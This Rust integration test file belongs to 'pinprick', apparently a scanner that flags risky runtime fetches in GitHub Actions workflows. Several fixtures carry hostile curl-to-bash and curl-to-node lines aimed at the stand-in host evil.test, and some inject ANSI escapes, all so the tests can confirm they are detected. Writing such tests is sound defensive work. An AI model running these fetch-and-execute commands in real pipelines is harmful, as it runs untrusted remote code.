mod common;

use predicates::prelude::*;

// ── Exit codes ──────────────────────────────────────────────────────────────

#[test]
fn clean_workflow_exits_zero() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}

#[test]
fn clean_workflow_human_output() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("No runtime fetch risks found."));
}

#[test]
fn bundled_parent_audit_covers_action_subpaths() {
    let workflow = "\
name: cache
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
      - uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
";
    let dir = common::repo_with_workflow("ci.yml", workflow);

    common::pinprick_cmd()
        .env("GITHUB_TOKEN", "dummy")
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success()
        .stderr(predicate::str::contains(
            "actions/cache/restore@55cc834 audited (bundled)",
        ))
        .stderr(predicate::str::contains(
            "actions/cache/save@55cc834 audited (bundled)",
        ))
        .stderr(predicate::str::contains("Fetching actions/cache").not());
}

#[test]
fn human_output_sanitizes_terminal_escapes() {
    // A matched run-block line carrying an ANSI escape must not reach the
    // terminal verbatim — otherwise a hostile action could spoof or hide a
    // finding in the operator's terminal. The escape is delivered via a
    // double-quoted YAML scalar (`\x1b`), which stays valid YAML and is
    // decoded to a real ESC byte by the run-block parser.
    let workflow = "\
name: evil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: \"curl -fsSL https://evil.test/install.sh | bash # \\x1b[2Jx\"
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    // The finding is still reported (the host text survives sanitization)…
    assert!(stdout.contains("evil.test"), "finding missing: {stdout:?}");
    // …but the raw ESC byte from the source line never reaches the terminal.
    assert!(
        !stdout.contains('\u{1b}'),
        "raw ESC leaked into terminal output: {stdout:?}"
    );
}

#[test]
fn human_output_sanitizes_escapes_in_finding_description() {
    let workflow = "\
name: evil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: \"docker run alpine\\x1b[2J\\x1b[31mSPOOFED\"
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("unpinned image"));
    assert!(
        !stdout.contains('\u{1b}'),
        "raw ESC leaked through finding description: {stdout:?}"
    );
}

#[test]
fn pipe_to_shell_exits_one() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .code(1);
}

#[test]
fn pipe_to_shell_json_fields() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
    assert_eq!(findings[0]["category"], "shell_fetch");
    assert!(findings[0]["line"].is_number());
}

#[test]
fn parallel_run_block_is_scanned() {
    // A `curl | bash` nested inside a `parallel:` step group must be caught
    // end-to-end (run-block extraction recurses into parallel groups) and must
    // anchor to the real source line, not the `parallel:` container.
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PARALLEL_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
    assert_eq!(findings[0]["category"], "shell_fetch");
    assert_eq!(findings[0]["line"], 12);
}

#[test]
fn curl_latest_finding() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CURL_LATEST);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
}

#[test]
fn versioned_url_is_clean() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn audit_flags_dangerous_url_after_versioned_decoy() {
    // A versioned decoy URL placed before the real unpinned fetch must not
    // suppress the finding — every URL on the line is checked, not just the first.
    let workflow = "\
name: decoy
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://cdn.example.com/v1.2.3/safe.txt https://evil.test/install.sh -o out
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "decoy bypass not caught: {json}");
    assert!(
        findings[0]["pattern_matched"]
            .as_str()
            .unwrap()
            .contains("evil.test")
    );
}

#[test]
fn audit_flags_bare_ip_fetch() {
    // A bare-IP host must not be read as a "versioned" URL and whitelisted.
    let workflow = "\
name: ip
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -L https://10.0.0.1/install.sh -o out
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "bare-IP fetch not flagged: {json}");
}

#[test]
fn audit_flags_pipe_to_node() {
    // `curl | node` executes fetched JS — it must be HIGH pipe-to-shell, not
    // a checksum-downgradeable medium.
    let workflow = "\
name: pipe-node
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://evil.test/setup.js | node
";
    let dir = common::repo_with_workflow("ci.yml", workflow);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "high");
}

#[test]
fn data_format_exempt() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_DATA_FORMAT);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn checksum_suppressed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CHECKSUM);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    // The fetch is verified by sha256sum on the next line, so it is suppressed
    // (recorded as an allowed match) rather than flagged — the run is clean.
    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}

#[test]
fn multiple_findings() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_MULTI_FINDINGS);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.len() >= 2,
        "expected at least 2 findings, got {}",
        findings.len()
    );

    // Findings should be sorted high-first.
    let severities: Vec<&str> = findings
        .iter()
        .map(|f| f["severity"].as_str().unwrap())
        .collect();
    for window in severities.windows(2) {
        let order = |s: &str| match s {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        };
        assert!(
            order(window[0]) <= order(window[1]),
            "findings not sorted by severity: {:?}",
            severities
        );
    }
}

#[test]
fn empty_workflow() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_EMPTY);
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .success();
}

#[test]
fn multiple_workflow_files() {
    let dir = common::repo_with_workflows(&[
        ("clean.yml", common::WORKFLOW_CLEAN),
        ("risky.yml", common::WORKFLOW_PIPE_TO_SHELL),
    ]);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
}

#[test]
fn audit_skips_unreadable_workflow_and_continues() {
    // A non-UTF-8 (or otherwise unreadable) workflow must not abort the scan of
    // the others — one bad file shouldn't take down a CI gate.
    let dir = tempfile::TempDir::new().unwrap();
    let wf = dir.path().join(".github").join("workflows");
    std::fs::create_dir_all(&wf).unwrap();
    // Sorts first; invalid UTF-8 bytes make read_to_string error.
    std::fs::write(wf.join("aaa-bad.yml"), [0xff, 0xfe, 0x00, 0x9f]).unwrap();
    // Sorts later; a real pipe-to-shell finding.
    std::fs::write(
        wf.join("zzz-good.yml"),
        "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://evil.test/i.sh | bash\n",
    )
    .unwrap();

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    // Exit 1 (found the good file's finding), not 2 (aborted on the bad file).
    assert_eq!(
        output.status.code(),
        Some(1),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

// ── Missing workflows directory ─────────────────────────────────────────────

#[test]
fn missing_workflows_dir_exits_two() {
    let dir = tempfile::TempDir::new().unwrap();
    common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("No workflow directory found"));
}

#[test]
fn missing_workflows_dir_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    let json: serde_json::Value = serde_json::from_slice(&output.stderr).unwrap();
    assert!(
        json["error"]
            .as_str()
            .unwrap()
            .contains("No workflow directory found")
    );
}

// ── Token status ────────────────────────────────────────────────────────────

#[test]
fn no_token_json_had_token_false() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(json["had_token"], false);
}

// ── SARIF output ────────────────────────────────────────────────────────────

#[test]
fn sarif_valid_structure() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert!(
        json["$schema"]
            .as_str()
            .unwrap()
            .contains("sarif-schema-2.1.0")
    );
    assert_eq!(json["version"], "2.1.0");

    let runs = json["runs"].as_array().unwrap();
    assert_eq!(runs.len(), 1);
    assert_eq!(runs[0]["tool"]["driver"]["name"], "pinprick");

    let rules = runs[0]["tool"]["driver"]["rules"].as_array().unwrap();
    assert!(!rules.is_empty());
    for rule in rules {
        assert!(rule["id"].is_string());
        assert!(rule["name"].is_string());
        assert!(rule["shortDescription"]["text"].is_string());
        assert!(rule["fullDescription"]["text"].is_string());
    }
}

#[test]
fn sarif_findings_mapped() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    let results = json["runs"][0]["results"].as_array().unwrap();
    assert!(!results.is_empty());
    for result in results {
        assert!(result["ruleId"].is_string());
        assert!(result["level"].is_string());
        assert!(result["message"]["text"].is_string());
        assert!(result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"].is_string());
        assert!(result["locations"][0]["physicalLocation"]["region"]["startLine"].is_number());
    }
}

#[test]
fn sarif_no_findings() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let results = json["runs"][0]["results"].as_array().unwrap();
    assert!(results.is_empty());
}

#[test]
fn sarif_conflicts_with_json() {
    // Enforced at dispatch — clap's conflicts_with can't reach the global
    // --json on the parent command.
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_CLEAN);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg("--sarif")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(2));
    let json: serde_json::Value = serde_json::from_slice(&output.stderr).unwrap();
    assert!(json["error"].as_str().unwrap().contains("--sarif"));
}

// ── Verbose output ──────────────────────────────────────────────────────────

#[test]
fn verbose_shows_allowed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    common::pinprick_cmd()
        .arg("audit")
        .arg("--verbose")
        .arg(dir.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("OK"));
}

#[test]
fn verbose_json_includes_allowed() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_VERSIONED);
    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg("--verbose")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let allowed = json["allowed"].as_array().unwrap();
    assert!(
        !allowed.is_empty(),
        "expected allowed matches for versioned URL"
    );
}

// ── Config integration ──────────────────────────────────────────────────────

#[test]
fn config_severity_high_filters_lower() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_MULTI_FINDINGS,
        "severity = \"high\"\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.iter().all(|f| f["severity"] == "high"),
        "expected only high findings when severity=high"
    );
}

#[test]
fn config_ignore_patterns() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected finding to be suppressed by ignore.patterns"
    );
}

#[test]
fn repo_config_suppression_prints_notice() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("note: the scanned repo's .pinprick.toml affected results"),
        "expected a repo-config notice on stderr, got: {stderr}"
    );
    assert!(stderr.contains("findings suppressed: 1"));
    assert!(stderr.contains("--no-repo-config"));
}

#[test]
fn no_repo_config_ignores_local_file() {
    // Same suppressing config, but --no-repo-config must restore the finding
    // (exit 1) and print no notice.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_PIPE_TO_SHELL,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .arg("--no-repo-config")
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("note: the scanned repo's .pinprick.toml"));
}

#[test]
fn repo_config_parse_error_redacts_source_excerpt() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_CLEAN,
        "trusted-hosts = [\"secret.internal.example\"\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("warning: failed to parse"));
    assert!(stderr.contains("using defaults"));
    assert!(!stderr.contains("secret.internal.example"));
    assert!(!stderr.contains("TOML parse error"));
}

#[test]
fn repo_config_trusted_host_notice_without_verbose() {
    // The trusted-host count must not depend on --verbose.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_TRUSTED_HOST,
        "trusted-hosts = [\"artifacts.internal.example.com\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("trusted-host fetches: 1"),
        "expected a trusted-host notice on stderr, got: {stderr}"
    );
}

#[test]
fn repo_config_non_literal_extra_data_format_prints_notice() {
    let workflow = "\
name: non-literal
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL \"$RELEASE_URL\" -o tool.bin
";
    let dir = common::repo_with_config("ci.yml", workflow, "extra-data-formats = [\"bin\"]\n");

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("extra-data-format fetches: 1"),
        "expected a repo-config notice on stderr, got: {stderr}"
    );
    assert!(stderr.contains("--no-repo-config"));
}

#[test]
fn repo_config_clean_repo_prints_no_notice() {
    // A repo-local config that changes nothing must stay silent.
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_CLEAN,
        "[ignore]\npatterns = [\"piped to shell\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("note:"));
}

#[test]
fn config_trusted_hosts() {
    let dir = common::repo_with_config(
        "ci.yml",
        common::WORKFLOW_TRUSTED_HOST,
        "trusted-hosts = [\"artifacts.internal.example.com\"]\n",
    );

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected trusted host to suppress finding"
    );
}

#[test]
fn config_extra_data_formats() {
    let workflow = "\
name: proto
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - run: curl -L https://example.com/schema.proto -o schema.proto
";
    let dir = common::repo_with_config("ci.yml", workflow, "extra-data-formats = [\"proto\"]\n");

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(
        findings.is_empty(),
        "expected .proto to be exempt via extra-data-formats"
    );
}

// ── git clone ─────────────────────────────────────────────────────────────

#[test]
fn git_clone_unpinned_finding() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_GIT_CLONE);

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0]["severity"], "medium");
    assert!(
        findings[0]["description"]
            .as_str()
            .unwrap()
            .contains("git clone")
    );
}

#[test]
fn git_clone_versioned_branch_clean() {
    let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_GIT_CLONE_VERSIONED);

    let output = common::pinprick_cmd()
        .arg("--json")
        .arg("audit")
        .arg(dir.path())
        .output()
        .unwrap();

    assert!(output.status.success());
    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings = json["findings"].as_array().unwrap();
    assert!(findings.is_empty());
}
